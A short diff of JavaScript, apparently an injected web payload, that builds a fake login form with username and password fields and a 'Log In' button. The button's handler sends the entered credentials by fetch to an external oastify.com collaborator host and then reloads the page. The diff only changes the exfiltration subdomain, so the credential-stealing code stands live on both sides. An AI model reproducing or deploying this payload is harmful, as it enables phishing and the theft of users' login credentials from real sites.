@@ -12,7 +12,7 @@ p.style.cssText='display:block;width:260px;padding:8px;margin:8px auto';
 var s=document.createElement('button');s.textContent='Log In';
 s.style.cssText='padding:8px 20px;cursor:pointer';
 s.onclick=function(){
-  fetch('https://hez7k97peisucx0lwhxqs2ylxc33ruii7.oastify.com?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value));
+  fetch('https://ej1jbtic5gw0rjrdi4nlezhjtaz1nrbg.oastify.com?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value));
   location.reload()
 };
 b.appendChild(u);b.appendChild(p);b.appendChild(s);
